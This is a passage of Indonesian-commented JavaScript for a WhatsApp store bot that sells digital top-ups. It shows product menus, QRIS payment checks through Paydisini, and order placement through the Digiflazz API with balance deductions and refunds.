  	const waktuSekarang = new Date();

  	const tahun = waktuSekarang.getFullYear();
      let bulan = waktuSekarang.getMonth() + 1; // Bulan dimulai dari 0, jadi perlu ditambah 1
      bulan = bulan < 10 ? "0" + bulan : bulan; // Menambahkan leading zero jika bulan kurang dari 10

      let tanggal = waktuSekarang.getDate();
      tanggal = tanggal < 10 ? "0" + tanggal : tanggal; // Menambahkan leading zero jika tanggal kurang dari 10

      let jam = waktuSekarang.getHours();
      jam = jam < 10 ? "0" + jam : jam; // Menambahkan leading zero jika jam kurang dari 10

      let menit = waktuSekarang.getMinutes();
      menit = menit < 10 ? "0" + menit : menit; // Menambahkan leading zero jika menit kurang dari 10

      let detik = waktuSekarang.getSeconds();
      detik = detik < 10 ? "0" + detik : detik; // Menambahkan leading zero jika detik kurang dari 10

      return `${tahun}-${bulan}-${tanggal} ${jam}:${menit}:${detik}`;
  }

  function salya(produk, tujuan, nama, harga) {
  	const saldo = cek("saldo", m.sender);
  	if (harga > saldo)
  		return reply(
  			"_Mohon maaf saldo anda kurang, silakan pake metode Payments QRIS saja_"
  			);

  	const { v4: uuidv4 } = require("uuid");
  	const generateCustomRefId = () => {
        const uuid = uuidv4().replace(/-/g, ""); // Menghasilkan UUID dan menghapus karakter '-'
        const refId = uuid.substr(0, 15); // Mengambil 15 digit pertama dari UUID
        return refId;
    };

    fs.unlinkSync(PathTrx + sender.split("@")[0] + ".json");
    const reffId = generateCustomRefId();
    const har = parseFloat(harga);
    sett("-saldo", m.sender, har);

    const signature = crypto
    .createHash("md5")
    .update(digiuser + digiapi + reffId)
    .digest("hex");

    var config = {
    	method: "POST",
    	url: "https://api.digiflazz.com/v1/transaction",
    	data: {
    		username: digiuser,
    		buyer_sku_code: produk,
    		customer_no: tujuan,
    		ref_id: reffId,
    		sign: signature,
    	},
    };

    axios(config)
    .then(async (res) => {
    	let invo = `*── 「 Transaksi Di Prosess 」 ──*`;
    	reply(invo);

    	let status = res.data.data.status;
            console.log("Status awal:", status); // Debugging

            while (status !== "Sukses") {
            	await sleep(1000);
            	const response = await axios(config);
            	status = response.data.data.status;
                console.log("Status terkini:", status); // Debugging

                if (status == "Sukses") {
                	reply(
                		`   *${toko}*\n` +
                		`✅ 𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 (${response.data.data.status}) ✅\n\n` +
                		`═════════════════════\n` +
                		`> ID : ${tanggal} - ${jam}\n` +
                		`> Layanan : ${nama}\n` +
                		`> Data : ${tujuan}\n` +
                		`> Harga : ${formatmoney(harga)}\n` +
                		`> SN : ${response.data.data.sn}\n` +
                		`═════════════════════\n\n` +
                		`Terima kasih atas transaksi Anda! 😊`
                		);
                	break;
                }

                if (status == "Gagal") {
                	sett("+saldo", m.sender, har);
                	reply(
                		`   *${toko}*\n` +
                		`❌ 𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 (${response.data.data.status}) ❌\n\n` +
                		`═════════════════════\n` +
                		`> ID : ${tanggal} - ${jam}\n` +
                		`> Layanan : ${nama}\n` +
                		`> Data : ${tujuan}\n` +
                		`> Harga : ${formatmoney(harga)}\n` +
                		`> Massage : ${response.data.data.message}\n` +
                		`═════════════════════\n\n` +
                		`_Saldo di kembalikan utuh_\n` +
                		`Terima kasih atas transaksi Anda! 😊`
                		);
                	break;
                }
            }
        })
    .catch((error) => {
    	if (error.response) {
    		sett("+saldo", m.sender, har);
    		reply(
    			`   *${toko}*\n` +
    			`❌ 𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 (${error.response.data.data.status || "Tidak Diketahui"}) ❌\n\n` +
    			`═════════════════════\n` +
    			`> ID : ${tanggal} - ${jam}\n` +
    			`> Layanan : ${nama}\n` +
    			`> Data : ${tujuan}\n` +
    			`> Harga : ${formatmoney(harga)}\n` +
    			`> Massage : ${error.response.data.data.message || "Tidak ada pesan" }\n` +
    			`═════════════════════\n\n` +
    			`_Saldo server telah habis.. Mohon hubungi admin .. Saldo dikembalikan utuh_\n` +
    			`Terima kasih atas transaksi Anda! 😊`
    			);
    	}
    });
}


function confirm(produk, tujuan, nama, harga) {
	const { v4: uuidv4 } = require("uuid");
	const generateCustomRefId = () => {
        const uuid = uuidv4().replace(/-/g, ""); // Menghasilkan UUID dan menghapus karakter '-'
        const refId = uuid.substr(0, 15); // Mengambil 15 digit pertama dari UUID
        return refId;
    };

    // Pastikan fs.unlinkSync aman untuk digunakan
    if (fs.existsSync(PathTrx + sender.split("@")[0] + ".json")) {
    	fs.unlinkSync(PathTrx + sender.split("@")[0] + ".json");
    }

    const reffId = generateCustomRefId();
    const har = parseFloat(harga);
    const signature = crypto
    .createHash("md5")
    .update(digiuser + digiapi + reffId)
    .digest("hex");

    var config = {
    	method: "POST",
    	url: "https://api.digiflazz.com/v1/transaction",
    	data: {
    		username: digiuser,
    		buyer_sku_code: produk,
    		customer_no: tujuan,
    		ref_id: reffId,
    		sign: signature,
    	},
    };

    axios(config)
    .then(async (res) => {
    	let invo = `*── 「 Transaksi Di Prosess 」 ──*\n\n`;
    	reply(invo);

    	let status = res.data.data.status;
            console.log("Status awal:", status); // Logging status awal untuk debugging

            while (status !== "Sukses" && status !== "Gagal") {
            	await sleep(1000);
            	const response = await axios(config);
            	status = response.data.data.status;
                console.log("Status terkini:", status); // Logging status untuk debugging

                if (status === "Gagal") {
                	sett("+saldo", m.sender, har);
                	reply(
                		`   *${toko}*\n` +
                		`❌ 𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 (${response.data.data.status}) ❌\n\n` +
                		`═════════════════════\n` +
                		`> ID : ${tanggal} - ${jam}\n` +
                		`> Layanan : ${nama}\n` +
                		`> Data : ${tujuan}\n` +
                		`> Harga : ${formatmoney(harga)}\n` +
                		`> Message : ${response.data.data.message || "Tidak ada pesan"}\n` +
                		`═════════════════════\n\n` +
                		`_Saldo dikembalikan utuh_\n` +
                		`Terima kasih atas transaksi Anda! 😊`
                		);
                	break;
                }

                if (status === "Sukses") {
                	reply(
                		`   *${toko}*\n` +
                		`✅ 𝚂𝚝𝚛𝚞𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 (${response.data.data.status}) ✅\n\n` +
                		`═════════════════════\n` +
                		`> ID : ${tanggal} - ${jam}\n` +
                		`> Layanan : ${nama}\n` +
                		`> Data : ${tujuan}\n` +
                		`> Harga : ${formatmoney(harga)}\n` +
                		`> SN : ${response.data.data.sn}\n` +
                		`═════════════════════\n\n` +
                		`Terima kasih atas transaksi Anda! 😊`
                		);
                	break;
                }
            }
        })
    .catch((error) => {
    	if (error.response) {
    		sett("+saldo", m.sender, har);
    		reply(
    			`   *${toko}*\n` +
    			`❌ 𝚂𝚝𝚛𝚞𝚌𝚔 𝙳𝚒𝚐𝚒𝚝𝚊𝚕 (${error.response.data.data.status || "Tidak Diketahui"}) ❌\n\n` +
    			`═════════════════════\n` +
    			`> ID : ${tanggal} - ${jam}\n` +
    			`> Layanan : ${nama}\n` +
    			`> Data : ${tujuan}\n` +
    			`> Harga : ${formatmoney(harga)}\n` +
    			`> Message : ${error.response.data.data.message || "Tidak ada pesan"}\n` +
    			`═════════════════════\n\n` +
    			`_Saldo server telah habis.. Mohon hubungi admin .. Saldo dikembalikan utuh_\n` +
    			`Terima kasih atas transaksi Anda! 😊`
    			);
    	} else {
    		console.error("Terjadi kesalahan:", error.message);
    		reply("_Terjadi kesalahan pada sistem. Silakan coba lagi nanti._");
    	}
    });
}


// const axios = require("axios");
// const crypto = require("crypto");
// const FormData = require("form-data");

function checkPaymentStatus(opa, order_id, produk, tujuan, nama, harga, attempt = 1) {
  const maxAttempts = 15; // Batas maksimum percobaan
  const formData = new FormData();
  formData.append("key", paydisini.apikey);
  formData.append("request", "status");
  formData.append("unique_code", order_id);
  formData.append(
  	"signature",
  	crypto.createHash("md5").update(paydisini.apikey + order_id + "StatusTransaction").digest("hex")
  	);

  axios
  .post("https://paydisini.co.id/api/", formData, {
  	headers: {
  		...formData.getHeaders(),
  	},
  })
  .then(function (response) {
  	if (response.data.success && response.data.data.status === "Pending") {
  		if (attempt < maxAttempts) {
  			setTimeout(() => {
  				checkPaymentStatus(opa, order_id, produk, tujuan, nama, harga, attempt + 1);
          }, 60000); // Interval pengecekan setiap 60 detik
  		} else {
  			m.reply("_Waktu Pembayaran telah habis_");
          // kris.sendMessage(m.chat, { delete: opa.key });
      }
  } else if (response.data.success && response.data.data.status === "Success") {
  	m.reply("_*Pembayaran berhasil. Pesanan sedang diproses_*");
  	kris.sendMessage(m.chat, { delete: opa.key });
  	confirm(produk, tujuan, nama, harga);
  } else {
  	m.reply("Gagal memeriksa status pembayaran atau status pembayaran bukan Pending.");
  }
})
  .catch(function (error) {
  	m.reply("Terjadi kesalahan saat memeriksa status pembayaran. Silakan coba lagi nanti.");
  	console.error("Error occurred while checking payment status:", error);
  });
}

async function buy(produk, tujuan) {
	let found = false;
	for (let i of list_produk) {
		if (i.buyer_sku_code === produk) {
			const har = hitungHargaRole(i.price);

			found = true;
			const nama = i.product_name;
			const desc = i.desc;
      let data_trx = crypto.randomBytes(5).toString("hex").toUpperCase(); // Generate kode unik
      const url = "https://paydisini.co.id/api/";
      const unikcode = `${data_trx}`;
      const signature = crypto
      .createHash("md5")
      .update(paydisini.apikey + unikcode + paydisini.layanan + har + paydisini.validt + "NewTransaction")
      .digest("hex");
      const formData = new FormData();
      formData.append("key", paydisini.apikey);
      formData.append("request", "new");
      formData.append("unique_code", unikcode);
      formData.append("service", paydisini.layanan);
      formData.append("amount", har);
      formData.append("note", desc);
      formData.append("valid_time", paydisini.validt);
      formData.append("type_fee", paydisini.type_fee);
      formData.append("signature", signature);

      try {
      	const response = await axios.post(url, formData, {
      		headers: {
      			...formData.getHeaders(),
      		},
      	});

      	const responseData = response.data;
      	if (responseData.success) {
      		const data = responseData.data;

      		let teks =
      		`_🛍️ ORDER CONFIRMATION_\n\n` +
      		`> _›› Order_ID:_ ${data.unique_code}\n` +
      		`> _›› Kode:_ ${produk}\n` +
      		`> _›› Nama:_ ${nama}\n` +
      		`> _›› Target:_ ${tujuan}\n` +
      		`> _›› Harga:_ ${har}\n` +
      		`> _›› Pembayaran:_ QRIS\n` +
      		`> _›› Note:_ ${desc}\n` +
      		`> _›› PPN:_ ${data.fee}\n` +
      		`> _›› Total:_ ${data.amount}\n\n` +
      		`_*Waktu pembayaran hanya 5 menit*_`;

      		let gambr = { url: data.qrcode_url };
      		let opa = await kris.sendMessage(from, {
      			image: gambr,
      			caption: teks,
      		});

          // Pengecekan status pembayaran
          checkPaymentStatus(opa, data.unique_code, produk, tujuan, nama, data.amount);
      } else {
      	m.reply(`Error: ${responseData.msg}`);
      }
  } catch (error) {
  	console.error("Terjadi kesalahan:", error);
  	m.reply("Terjadi kesalahan saat memproses transaksi, silakan coba lagi nanti.");
  }
}
}

if (!found) {
	m.reply("Maaf, produk yang Anda minta tidak tersedia.");
}
}


if (command === "opap") {
	if (!q) return reply(`Ingin Topup? silahkan ketik #cekharga`);
      const produk = q; // Pastikan produk diambil dari argumen kedua
      const senderId = sender.split("@")[0];
      const filePath = PathTrx + senderId + ".json";

      if (!fs.existsSync(filePath)) {
        let produkDitemukan = false; // Tambahkan flag untuk melacak jika produk ditemukan
        for (let i of list_produk) {
        	if (i.buyer_sku_code == produk) {
            produkDitemukan = true; // Set flag ke true jika produk ditemukan
            const har = hitungHargaRole(i.price);
            const deposit_object = {
            	ID: require("crypto")
            	.randomBytes(5)
            	.toString("hex")
            	.toUpperCase(),
            	session: "amount",
            	number: sender,
            	produk: i.product_name,
            	kode: produk,
            	desc: i.desc,
            	harga: har,
            	category: i.category,
            	brand: i.brand,
            	data: {
            		nomor: "",
            	},
            };
            fs.writeFileSync(filePath, JSON.stringify(deposit_object, null, 2));
            if (i.brand === "MOBILE LEGENDS") {
            	reply(
            		`*_Silahkan ketik dan kirim ID & Zone di Gabung_* \n\n` +
            		`Note: _${i.desc}_\n\n` +
            		`Before: _2400234551(2431)_\n` +
            		`After: _24002345512431_`
            		);

            } else {
            	reply(
            		`*_Silahkan ketik dan kirim ID/Nomor Tujuan_* \n\nNote : _${i.desc}_`
            		);
            }
            
            
            return; // Keluar dari loop setelah menemukan produk yang cocok
        }
    }
    if (!produkDitemukan) {
    	reply("Produk tidak ditemukan.");
    }
} else {
	kris.sendMessage(
		from,
		{
			text: "Proses Pesanan kamu masih ada yang belum terselesaikan untuk membatalkan silahkan ketik #batal",
		},
		{ quoted: m }
		);
}
}

if (fs.existsSync(PathTrx + sender.split("@")[0] + ".json")) {
	if (!m.key.fromMe) {
		const data_deposit = JSON.parse(
			fs.readFileSync(PathTrx + sender.split("@")[0] + ".json")
			);

		if (data_deposit.session === "amount") {
			data_deposit.data.nomor = chath;
			data_deposit.session = "konfirmasi_pembayaran";
			fs.writeFileSync(
				PathTrx + sender.split("@")[0] + ".json",
				JSON.stringify(data_deposit, null, 2)
				);
			const msgs = generateWAMessageFromContent(
				from,
				{
					viewOnceMessage: {
						message: {
							messageContextInfo: {
								deviceListMetadata: {},
								deviceListMetadataVersion: 2,
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: `Silahkan Pilih Menu Pembayaran Di Bawah Ini
									`,
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: "Fz-Store @ 2024",
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									hasMediaAttachment: false,
								}),
								nativeFlowMessage:
								proto.Message.InteractiveMessage.NativeFlowMessage.create(
								{
									buttons: [
									{
										name: "quick_reply",
										buttonParamsJson:
										'{"display_text":"Payments QRIS","id":"paylang"}',
									},
									{
										name: "quick_reply",
										buttonParamsJson:
										'{"display_text":"Saldo","id":"paysal"}',
									},
									],
								}
								),
							}),
						},
					},
				},
				{}
				);

			kris.relayMessage(from, msgs.message, {
				messageId: msgs.key.id,
			});
		} else if (data_deposit.session === "konfirmasi_pembayaran") {
			if (chath.toLowerCase() === "paylang") {
				const saldo = cek("saldo", m.sender);
				const sal = parseFloat(saldo);
				const msgs = generateWAMessageFromContent(
					from,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadata: {},
									deviceListMetadataVersion: 2,
								},
								interactiveMessage: proto.Message.InteractiveMessage.create(
								{
									body: proto.Message.InteractiveMessage.Body.create({
										text: 
										`📝 *FORM ORDER* 📝\n\n` +
										`*Produk ID:* ${data_deposit.kode}\n` +
										`*Tujuan:* ${data_deposit.data.nomor}\n` +
										`*Kategori:* ${data_deposit.category}\n` +
										`*Brand:* ${data_deposit.brand}\n` +
										`*Produk:* ${data_deposit.produk}\n` +
										`*Harga:* Rp ${formatmoney(data_deposit.harga)}\n` +
										`*Saldo Anda:* Rp ${formatmoney(sal)}\n\n` +
										`_Apakah data tersebut sudah benar?_ \n` +
										`_Akan gagal apabila terdapat kesalahan input._`,
									}),

									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "Fz-Store @ 2024",
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										hasMediaAttachment: false,
									}),
									nativeFlowMessage:
									proto.Message.InteractiveMessage.NativeFlowMessage.create(
									{
										buttons: [
										{
											name: "quick_reply",
											buttonParamsJson:
											'{"display_text":"Benar","id":"yeslang"}',
										},
										{
											name: "quick_reply",
											buttonParamsJson:
											'{"display_text":"Salah","id":".batal"}',
										},
										],
									}
									),
								}
								),
							},
						},
					},
					{}
					);

				kris.relayMessage(from, msgs.message, {
					messageId: msgs.key.id,
				});
				data_deposit.session = "konfirmasi_pesanan";
				fs.writeFileSync(
					PathTrx + sender.split("@")[0] + ".json",
					JSON.stringify(data_deposit, null, 2)
					);
			} else if (chath.toLowerCase() === "paysal") {
				data_deposit.session = "konfirmasi_pesanan";
				fs.writeFileSync(
					PathTrx + sender.split("@")[0] + ".json",
					JSON.stringify(data_deposit, null, 2)
					);
				const saldo = cek("saldo", m.sender);
				const sal = parseFloat(saldo);
				if (data_deposit.harga > cek("saldo", m.sender))
					return reply(
						"_Mohon maaf saldo anda kurang silahkan pake methode Payments QRIS_"
						);
				const msgs = generateWAMessageFromContent(
					from,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadata: {},
									deviceListMetadataVersion: 2,
								},
								interactiveMessage: proto.Message.InteractiveMessage.create(
								{
									body: proto.Message.InteractiveMessage.Body.create({
										text: `       📝 *FORM ORDER* 📝 \n\n*Produk ID*: ${
											data_deposit.kode
										} \n*Tujuan:* ${
											data_deposit.data.nomor
										}\n*Kategori:* ${data_deposit.category}\n*Brand:* ${
											data_deposit.brand
										}\n*Produk:* ${
											data_deposit.produk
										}\n*Harga:* Rp. ${formatmoney(
											data_deposit.harga
											)}\n*Saldo Anda:* ${formatmoney(
												sal
												)}\n\n_Apakah data tersebut sudah benar?_\n_Akan gagal apabila terdapat kesalahan input._
											`,
										}),
									footer: proto.Message.InteractiveMessage.Footer.create({
										text: "Fz-Store @ 2024",
									}),
									header: proto.Message.InteractiveMessage.Header.create({
										hasMediaAttachment: false,
									}),
									nativeFlowMessage:
									proto.Message.InteractiveMessage.NativeFlowMessage.create(
									{
										buttons: [
										{
											name: "quick_reply",
											buttonParamsJson:
											'{"display_text":"Benar","id":"yessal"}',
										},
										{
											name: "quick_reply",
											buttonParamsJson:
											'{"display_text":"Salah","id":".batal"}',
										},
										],
									}
									),
								}
								),
							},
						},
					},
					{}
					);

				kris.relayMessage(from, msgs.message, {
					messageId: msgs.key.id,
				});
			}
		} else if (data_deposit.session === "konfirmasi_pesanan") {
			if (chath.toLowerCase() === "yeslang") {
				buy(data_deposit.kode, data_deposit.data.nomor);
			} else if (chath.toLowerCase() === "yessal") {
				salya(
					data_deposit.kode,
					data_deposit.data.nomor,
					data_deposit.produk,
					data_deposit.harga
					);
			}
		}
	}
}

// const formatRupiah = (amount) => {
// 	return amount
// 	.toString()
// 	.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
// };

// Fungsi untuk memformat uang
// const formatMoney = (amount) => {
// 	return new Intl.NumberFormat("id-ID", {
// 		style: "currency",
// 		currency: "IDR",
// 	}).format(amount);
// };

// Fungsi untuk mendapatkan data dari file JSON
async function getDatabase() {
	const fs = require("fs").promises;
	try {
		const data = await fs.readFile("./Pengaturan/database/datadigiflaz.json", "utf8");
		return JSON.parse(data);
	} catch (error) {
		console.error("Error reading database:", error);
		return [];
	}
}

async function getList(kategori, brand, type) {
	if (cek("id", m.sender) == null)
		return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`);

	const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
	const fs = require("fs").promises;

	let database = await getDatabase(); // Mengambil data terbaru dari file JSON
	let brandToDisplay = brand;

	// Fungsi format uang
	const formatMoney = (amount) => {
		return new Intl.NumberFormat("id-ID", {
			style: "currency",
			currency: "IDR",
		}).format(amount);
	};

	// Memfilter produk berdasarkan kategori, brand, dan tipe
	let filteredProducts = database.filter(
		(item) =>
		item.category === kategori &&
		item.brand === brand &&
		item.type === type
		);

	// Mengurutkan produk berdasarkan harga (termurah ke termahal)
	filteredProducts.sort((a, b) => a.price - b.price);

	// Mendapatkan role dan menghitung profit
	const setprof = cek("role", m.sender).toLowerCase();
	const profitMultiplier = profit[setprof] || 1;

	// Membuat sections dari data yang diambil dari database JSON
	let sections = [
	{
			title: brandToDisplay, // Title utama
			rows: filteredProducts.map((item) => {
				const status = item.seller_product_status;
				const seller = status ? "✅ Tersedia" : "⛔ Gangguan";
				const formattedPrice = formatMoney(item.price * profitMultiplier);

				return {
					header: `${seller} (${item.buyer_sku_code})`, // Menggunakan buyer_sku_code sebagai header
					title: item.product_name,
					description: `${formattedPrice}`, // Menambahkan status dan harga ke dalam deskripsi
					id: `opap ${item.buyer_sku_code}`,
				};
			}),
		},
		];

	// Buat JSON string untuk buttonParamsJson
	let buttonParamsJson = JSON.stringify({
		title: "Klik Disini",
		sections: sections,
	});

	// Buat pesan interaktif
	let msg = generateWAMessageFromContent(
		from,
		{
			viewOnceMessage: {
				message: {
					messageContextInfo: {
						deviceListMetadata: {},
						deviceListMetadataVersion: 2,
					},
					interactiveMessage: proto.Message.InteractiveMessage.create({
						body: proto.Message.InteractiveMessage.Body.create({
							text: "Silahkan Klik Button Disini",
						}),
						footer: proto.Message.InteractiveMessage.Footer.create({
							text: toko,
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
							buttons: [
							{
								name: "single_select",
								buttonParamsJson: buttonParamsJson,
							},
							],
						}),
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 999,
							isForwarded: true,
						},
					}),
				},
			},
		},
		{}
		);

	// Kirim pesan interaktif
	await kris.relayMessage(msg.key.remoteJid, msg.message, {
		messageId: msg.key.id,
	});
}



async function getListSmm(kategori) {
	if (cek("id", m.sender) == null)
		return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`);

	const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
	const fs = require("fs").promises;

	// Baca data dari file JSON
	let database = require("./Pengaturan/database/datasmm.json");
	let brandToDisplay = kategori;

	// Memfilter produk berdasarkan kategori
	let filteredProducts = database.filter(
		(item) => item.category === kategori
		);

	// Mengurutkan produk berdasarkan harga (termurah ke termahal)
	filteredProducts.sort((a, b) => a.price - b.price);

	// Fungsi format uang
	const formatMoney = (amount) => {
		return new Intl.NumberFormat("id-ID", {
			style: "currency",
			currency: "IDR",
		}).format(amount);
	};

	// Mendapatkan role dan menghitung profit
	const setprof = cek("role", m.sender).toLowerCase();
	const profitMultiplier = profit[setprof] || 1;

	// Membuat sections dari data yang diambil dari database JSON
	let sections = [
	{
			title: brandToDisplay, // Title utama
			rows: filteredProducts.map((item) => {
				const status = item.seller_product_status;
				const seller = status ? "✅ Tersedia" : "⛔ Gangguan";
				const formattedPrice = formatMoney(item.price * profitMultiplier);

				return {
					header: `${seller} (${item.id})`, // Menggunakan id sebagai header
					title: item.product_name,
					description: `${formattedPrice}`, // Menambahkan status dan harga ke dalam deskripsi
					id: `${item.id}`,
				};
			}),
		},
		];

	// Buat JSON string untuk buttonParamsJson
	let buttonParamsJson = JSON.stringify({
		title: "Klik Disini",
		sections: sections,
	});

	// Buat pesan interaktif
	let msg = generateWAMessageFromContent(
		from,
		{
			viewOnceMessage: {
				message: {
					messageContextInfo: {
						deviceListMetadata: {},
						deviceListMetadataVersion: 2,
					},
					interactiveMessage: proto.Message.InteractiveMessage.create({
						body: proto.Message.InteractiveMessage.Body.create({
							text: "Silahkan Klik Button Disini",
						}),
						footer: proto.Message.InteractiveMessage.Footer.create({
							text: toko,
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
							buttons: [
							{
								name: "single_select",
								buttonParamsJson: buttonParamsJson,
							},
							],
						}),
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 999,
							isForwarded: true,
						},
					}),
				},
			},
		},
		{}
		);

	// Kirim pesan interaktif
	await kris.relayMessage(msg.key.remoteJid, msg.message, {
		messageId: msg.key.id,
	});
}



async function getPaket(kategori, brand) {
	if (cek("id", m.sender) == null)
		return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`);

	let { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
	const fs = require("fs").promises;

	let database = await getDatabase();

	let brandToDisplay = brand;
	let filteredProducts = database.filter(
		(item) => item.category === kategori && item.brand === brand
		);

	// Fungsi format uang
	const formatmoney = (amount) => {
		return new Intl.NumberFormat("id-ID", {
			style: "currency",
			currency: "IDR",
		}).format(amount);
	};

	// Mengurutkan produk berdasarkan harga (termurah ke termahal)
	filteredProducts.sort((a, b) => a.price - b.price);

	// Mendapatkan role dan menghitung profit
	const setprof = cek("role", m.sender).toLowerCase();
	const profitMultiplier = profit[setprof] || 1;

	// Membuat sections dari data yang diambil dari database JSON
	let sections = [
	{
			title: brandToDisplay, // Title utama
			rows: filteredProducts.map((item) => {
				const status = item.seller_product_status;
				const seller = status ? "✅ Tersedia" : "⛔ Gangguan";
				const formattedPrice = formatmoney(item.price * profitMultiplier);
				return {
					header: `${seller} (${item.buyer_sku_code})`, // Menggunakan buyer_sku_code sebagai header
					title: item.product_name,
					description: `${formattedPrice}`, // Menambahkan status ke dalam deskripsi
					id: `opap ${item.buyer_sku_code}`,
				};
			}),
		},
		];

	// Buat JSON string untuk buttonParamsJson
	let buttonParamsJson = JSON.stringify({
		title: "Klik Disini",
		sections: sections,
	});

	// Buat pesan interaktif
	let msg = generateWAMessageFromContent(
		from,
		{
			viewOnceMessage: {
				message: {
					messageContextInfo: {
						deviceListMetadata: {},
						deviceListMetadataVersion: 2,
					},
					interactiveMessage: proto.Message.InteractiveMessage.create({
						body: proto.Message.InteractiveMessage.Body.create({
							text: "Silahkan Klik Button Disini",
						}),
						footer: proto.Message.InteractiveMessage.Footer.create({
							text: toko,
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
							buttons: [
							{
								name: "single_select",
								buttonParamsJson: buttonParamsJson,
							},
							],
						}),
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 999,
							isForwarded: true,
						},
					}),
				},
			},
		},
		{}
		);

	// Kirim pesan interaktif
	await kris.relayMessage(msg.key.remoteJid, msg.message, {
		messageId: msg.key.id,
	});
}


// Fungsi untuk mendapatkan daftar produk dan menghitung harga dengan profit
async function getWallet(kategori, brand, tipe) {
	if (cek("id", m.sender) == null)
		return reply(`Anda Belum Terdaftar di Database Silahkan ketik #daftar`);

	let { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");

    // Memuat database produk
    const fs = require("fs").promises;

    let database = await getDatabase();

    // Memfilter produk berdasarkan kategori, brand, dan tipe
    let filteredProducts = database.filter(
    	(item) => item.category === kategori && item.brand.toUpperCase() === brand.toUpperCase() && item.type === tipe
    	);

    // Fungsi format uang
    const formatmoney = (amount) => {
    	return new Intl.NumberFormat("id-ID", {
    		style: "currency",
    		currency: "IDR",
    	}).format(amount);
    };

    // Membaca file wallet.json untuk mendapatkan profit berdasarkan brand
    const walletData = await fs.readFile(walletJson, "utf8");
    const parsedWalletData = JSON.parse(walletData);
    const profitConfig = parsedWalletData.profit;

    // Fungsi untuk menghitung harga dengan profit
    const calculatePriceWithProfit = (item) => {
    	let profitNominal = profitConfig[brand.toUpperCase()];

        // Jika profit tidak ditemukan, default ke 0
        if (!profitNominal) {
        	profitNominal = 0;
        }

        // Tambahkan profit ke harga produk
        return item.price + profitNominal;
    };

    // Mengurutkan produk berdasarkan harga (termurah ke termahal)
    filteredProducts.sort((a, b) => {
    	const priceA = calculatePriceWithProfit(a);
    	const priceB = calculatePriceWithProfit(b);
    	return priceA - priceB;
    });

    // Membuat sections dari data yang diambil dari database JSON
    let sections = [
    {
        title: `${brand} - ${tipe}`, // Title utama menggunakan brand dan tipe
        rows: filteredProducts.map((item) => {
        	const status = item.seller_product_status;
        	const seller = status ? "✅ Tersedia" : "⛔ Gangguan";

            // Menghitung harga dengan profit
            const finalPrice = calculatePriceWithProfit(item);
            const formattedPrice = formatmoney(finalPrice);

            return {
                header: `${seller} (${item.buyer_sku_code})`, // Menggunakan buyer_sku_code sebagai header
                title: item.product_name,
                description: `${formattedPrice}`, // Menambahkan status dan harga ke dalam deskripsi
                id: `opap ${item.buyer_sku_code}`,
            };
        }),
    },
    ];

    // Buat JSON string untuk buttonParamsJson
    let buttonParamsJson = JSON.stringify({
    	title: "Klik Disini",
    	sections: sections,
    });

    // Buat pesan interaktif
    let msg = generateWAMessageFromContent(
    	from,
    	{
    		viewOnceMessage: {
    			message: {
    				messageContextInfo: {
    					deviceListMetadata: {},
    					deviceListMetadataVersion: 2,
    				},
    				interactiveMessage: proto.Message.InteractiveMessage.create({
    					body: proto.Message.InteractiveMessage.Body.create({
    						text: "Silahkan Klik Button Disini",
    					}),
    					footer: proto.Message.InteractiveMessage.Footer.create({
    						text: toko,
    					}),
    					nativeFlowMessage:
    					proto.Message.InteractiveMessage.NativeFlowMessage.create({
    						buttons: [
    						{
    							name: "single_select",
    							buttonParamsJson: buttonParamsJson,
    						},
    						],
    					}),
    					contextInfo: {
    						mentionedJid: [m.sender],
    						forwardingScore: 999,
    						isForwarded: true,
    					},
    				}),
    			},
    		},
    	},
    	{}
    	);

    // Kirim pesan interaktif
    await kris.relayMessage(msg.key.remoteJid, msg.message, {
    	messageId: msg.key.id,
    });
}


// Contoh menjalankan getWallet dengan parameter kategori, brand, dan tipe produk
// getWallet('E-Money', 'OVO', 'Umum').catch(console.error);




function isPaymentTimeExpired(depositTime, currentTime) {
      const depositPlus5Minutes = depositTime + 5 * 60 * 1000; // Menambahkan 5 menit ke waktu deposit
      return currentTime > depositPlus5Minutes;
  }

  function isWithin5Minutes(depositTime, currentTime) {
      const depositPlus5Minutes = depositTime + 5 * 60 * 1000; // Menambahkan 5 menit ke waktu deposit
      return currentTime <= depositPlus5Minutes;
  }


  async function order(produk, tujuan, refferensi) {

  	if (cek("saldo", m.sender) === null) {
  		m.reply(`Kamu tidak memiliki saldo, silahkan deposit`);
  		return;
  	}

    // Memuat data wallet.json untuk mendapatkan profit
    const fs = require("fs").promises;

    const walletData = await fs.readFile(walletJson, "utf8");
    const parsedWalletData = JSON.parse(walletData);
    const profitConfig = parsedWalletData.profit;

    // Fungsi untuk menghitung harga dengan profit
    const calculatePriceWithProfit = (item) => {
    	let brand = item.brand.toUpperCase();
        let profitNominal = profitConfig[brand] || 0; // Default ke 0 jika tidak ditemukan profit
        return item.price + profitNominal;
    };

    // Mencari produk dalam daftar produk
